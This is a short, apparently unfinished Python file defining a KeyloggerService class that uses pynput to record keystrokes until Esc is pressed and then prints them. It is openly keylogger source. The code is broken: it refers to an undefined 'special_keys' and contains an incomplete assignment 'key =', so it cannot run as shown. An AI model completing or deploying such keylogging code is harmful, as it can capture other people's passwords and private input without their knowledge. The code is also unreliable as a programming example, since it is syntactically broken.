from inter_face import IKeyLogger
from typing import List
from pynput.keyboard import Key, Listener, KeyCode


class KeyloggerService(IKeyLogger):
    def __init__(self):
        self.presses = list()

    def start_logging(self) -> None:
        with Listener(on_press= self.press) as self.listener:
            self.listener.join()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.presses

    def press(self,key):
        if key == Key.esc:
            self.stop_logging()
        elif key in special_keys:
            key =
            self.presses.append(key)

x = KeyloggerService()
x.start_logging()
print(x.get_logged_keys())
